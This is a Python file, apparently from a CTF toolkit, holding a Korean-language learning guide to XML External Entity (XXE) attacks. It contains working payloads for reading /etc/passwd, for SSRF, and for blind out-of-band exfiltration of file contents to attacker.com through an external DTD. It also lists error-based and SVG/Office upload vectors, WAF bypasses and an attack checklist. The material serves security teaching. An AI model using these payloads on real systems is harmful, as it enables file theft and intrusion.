"""XML External Entity (XXE) Learning Guide."""

XXE_GUIDE = {
    "attack_type": "xxe",
    "title": "XML External Entity (XXE) Guide",
    "severity": "high",
    "difficulty": "intermediate",

    "overview": """XXE는 XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점입니다.
공격자는 외부 엔티티를 정의하여 로컬 파일을 읽거나 내부 네트워크에 요청을 보낼 수 있습니다.

SOAP API, SVG 업로드, Office 문서, RSS/Atom 피드 등 XML을 처리하는 모든 곳에서 발생할 수 있습니다.
최신 XML 파서는 기본적으로 외부 엔티티를 비활성화하지만, 레거시 시스템에서는 여전히 흔합니다.""",

    "impact": [
        "로컬 파일 읽기 (/etc/passwd, 설정 파일)",
        "SSRF (내부 네트워크 접근)",
        "DoS (Billion Laughs Attack)",
        "포트 스캔",
        "원격 코드 실행 (특정 조건에서)",
    ],

    "vulnerable_patterns": [
        "DocumentBuilder.parse(userInput);",
        "simplexml_load_string($xml);",
        "etree.parse(xml_input)",
    ],

    "techniques": {
        "basic": {
            "name": "Basic XXE (File Read)",
            "difficulty": "beginner",
            "how_it_works": """기본 XXE는 외부 엔티티를 정의하여 로컬 파일을 읽습니다.
SYSTEM 키워드로 파일 경로를 지정하면 해당 파일 내용이 엔티티 값으로 대체됩니다.""",
            "prerequisites": [
                "XML 입력이 처리됨",
                "외부 엔티티 처리가 활성화됨",
                "결과가 응답에 반영됨",
            ],
            "payloads": [
                {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "purpose": "passwd 파일 읽기", "expected": "passwd 내용 출력"},
                {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "purpose": "Windows 파일 읽기", "expected": "win.ini 내용"},
                {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/test\">]><foo>&xxe;</foo>", "purpose": "SSRF 테스트", "expected": "외부 요청 발생"},
            ],
            "detection_patterns": [
                "파일 내용이 응답에 포함됨",
                "외부 서버에서 요청 수신",
            ],
            "common_mistakes": [
                "XML 선언이 필요할 수 있음",
                "엔티티 참조(&xxe;)가 출력 위치에 있어야 함",
            ],
        },

        "blind_oob": {
            "name": "Blind XXE (Out-of-Band)",
            "difficulty": "intermediate",
            "how_it_works": """응답에서 데이터를 확인할 수 없을 때, 외부 서버로 데이터를 전송합니다.
파라미터 엔티티를 사용하여 파일 내용을 URL에 포함시켜 전송합니다.""",
            "prerequisites": [
                "외부 네트워크 접근 가능",
                "파라미터 엔티티 처리 가능",
            ],
            "payloads": [
                {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>test</foo>", "purpose": "외부 DTD 로드", "expected": "evil.dtd 실행"},
                {"payload": "<!-- evil.dtd 내용 -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">\n%eval;\n%exfil;", "purpose": "데이터 추출 DTD", "expected": "데이터가 URL로 전송"},
            ],
            "detection_patterns": [
                "외부 서버에서 DTD 요청 수신",
                "데이터가 URL 파라미터에 포함되어 수신",
            ],
            "common_mistakes": [
                "파라미터 엔티티(%)와 일반 엔티티(&) 구분",
                "외부 DTD 파일이 접근 가능해야 함",
            ],
        },

        "error_based": {
            "name": "Error-Based XXE",
            "difficulty": "intermediate",
            "how_it_works": """에러 메시지를 통해 파일 내용을 노출시킵니다.
존재하지 않는 파일을 참조하는 엔티티에 실제 파일 내용을 포함시켜 에러에 노출되게 합니다.""",
            "prerequisites": [
                "XML 파싱 에러가 노출됨",
            ],
            "payloads": [
                {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]><foo>test</foo>", "purpose": "에러에 파일 내용 포함", "expected": "에러 메시지에 passwd 내용"},
            ],
            "detection_patterns": [
                "에러 메시지에 파일 내용 포함",
            ],
            "common_mistakes": [
                "에러 출력이 상세해야 함",
            ],
        },

        "svg_upload": {
            "name": "SVG File Upload XXE",
            "difficulty": "beginner",
            "how_it_works": """SVG 파일은 XML 기반이므로 XXE 페이로드를 포함할 수 있습니다.
이미지 업로드 기능에서 SVG를 허용하면 XXE 공격이 가능할 수 있습니다.""",
            "prerequisites": [
                "SVG 파일 업로드 허용",
                "서버에서 SVG를 파싱함",
            ],
            "payloads": [
                {"payload": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "purpose": "SVG에 XXE 삽입", "expected": "이미지 또는 에러에 파일 내용"},
            ],
            "detection_patterns": [
                "SVG 렌더링 시 파일 내용 표시",
                "이미지 로드 에러에 파일 내용",
            ],
            "common_mistakes": [
                "SVG가 클라이언트에서만 렌더링되면 서버측 XXE 불가",
            ],
        },

        "xlsx_docx": {
            "name": "Office Document XXE",
            "difficulty": "intermediate",
            "how_it_works": """XLSX, DOCX 등 Office 문서는 ZIP으로 압축된 XML 파일입니다.
내부 XML 파일에 XXE 페이로드를 삽입하여 공격할 수 있습니다.""",
            "prerequisites": [
                "Office 문서 업로드/처리 기능",
                "서버에서 문서를 파싱함",
            ],
            "payloads": [
                {"payload": "[XLSX 내 xl/workbook.xml에 XXE 삽입]", "purpose": "Excel 파일 XXE", "expected": "파일 내용 또는 SSRF"},
            ],
            "detection_patterns": [
                "문서 처리 결과에 파일 내용",
                "외부 서버에서 요청 수신",
            ],
            "common_mistakes": [
                "문서 구조를 유지해야 함 - 잘못된 XML은 거부됨",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "XML 입력 포인트 식별",
            "expected_result": "XML을 처리하는 모든 기능 파악",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "API, 파일 업로드, RSS, SOAP 등"
        },
        {
            "step": 2,
            "action": "외부 엔티티 지원 확인",
            "expected_result": "엔티티가 처리되는지 확인",
            "command_example": "ctf-toolkit xxe scan -u 'http://target.com/api'",
            "notes": "간단한 엔티티 정의 후 참조"
        },
        {
            "step": 3,
            "action": "로컬 파일 읽기 시도",
            "expected_result": "/etc/passwd 또는 win.ini 내용",
            "command_example": None,
            "notes": "file:// 프로토콜 사용"
        },
        {
            "step": 4,
            "action": "Blind XXE 테스트",
            "expected_result": "외부 서버에서 요청 수신",
            "command_example": None,
            "notes": "파라미터 엔티티로 외부 DTD 로드"
        },
        {
            "step": 5,
            "action": "SSRF 시도",
            "expected_result": "내부 서비스 접근",
            "command_example": None,
            "notes": "http://localhost, 메타데이터 엔드포인트"
        },
        {
            "step": 6,
            "action": "데이터 추출",
            "expected_result": "민감 파일 내용 획득",
            "command_example": None,
            "notes": "설정 파일, 소스 코드 등"
        },
        {
            "step": 7,
            "action": "파일 업로드 XXE",
            "expected_result": "SVG, XLSX, DOCX 등 통한 XXE",
            "command_example": None,
            "notes": "XML 기반 파일 포맷 테스트"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "파일 내용이 응답에 포함됨",
            "confidence": "high",
            "db_specific": None,
            "example_response": "root:x:0:0:root:/root:/bin/bash"
        },
        {
            "pattern_type": "behavior",
            "indicator": "외부 서버에서 DTD 요청 수신",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "error_message",
            "indicator": "XML 파싱 에러에 파일 경로/내용",
            "confidence": "high",
            "db_specific": None,
            "example_response": "Error: failed to load external entity '/etc/passwd'"
        },
        {
            "pattern_type": "behavior",
            "indicator": "SSRF 동작 (내부 서비스 응답)",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
    ],

    "waf_bypass": [
        {
            "technique": "UTF-16 인코딩",
            "example": "UTF-16으로 인코딩된 XML",
            "effective_against": "UTF-8 기반 필터"
        },
        {
            "technique": "파라미터 엔티티",
            "example": "<!ENTITY % xxe SYSTEM ...>%xxe;",
            "effective_against": "일반 엔티티 필터"
        },
        {
            "technique": "외부 DTD",
            "example": "페이로드를 외부 DTD에 배치",
            "effective_against": "인라인 엔티티 필터"
        },
    ],

    "ctf_tips": [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> 기본 페이로드",
        "응답에 출력 안 되면 Blind XXE (외부 DTD) 시도",
        "SVG 업로드 가능하면 XXE 삽입하여 업로드",
        "XLSX, DOCX는 unzip 후 XML 수정하고 다시 압축",
        "PHP expect:// 래퍼로 RCE 가능 (expect://id)",
        "Java에서는 jar:// 프로토콜로 원격 파일 로드 가능",
        "에러가 상세하면 Error-based XXE 시도",
        "OOB XXE: 파라미터 엔티티로 데이터를 URL에 포함하여 전송",
    ],
}
